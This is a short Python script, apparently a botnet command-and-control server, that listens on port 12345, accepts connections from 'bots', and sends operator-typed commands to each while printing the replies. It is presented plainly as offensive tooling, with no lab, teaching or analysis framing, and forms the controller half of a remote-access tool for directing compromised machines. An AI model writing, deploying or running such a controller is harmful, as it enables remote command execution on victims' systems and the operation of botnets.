# Copyright (c) 2026 transcrime
import socket
import threading

bots = []

def handle_bot(conn, addr):
    print(f"[+] Bot connected: {addr}")
    while True:
        cmd = input("Command: ")
        conn.send(cmd.encode())
        if cmd.lower() == "exit":
            break
        print(conn.recv(2048).decode())

server = socket.socket()
server.bind(("0.0.0.0", 12345))
server.listen(5)

print("[*] C2 Listening...")
while True:
    conn, addr = server.accept()
    threading.Thread(target=handle_bot, args=(conn, addr)).start()

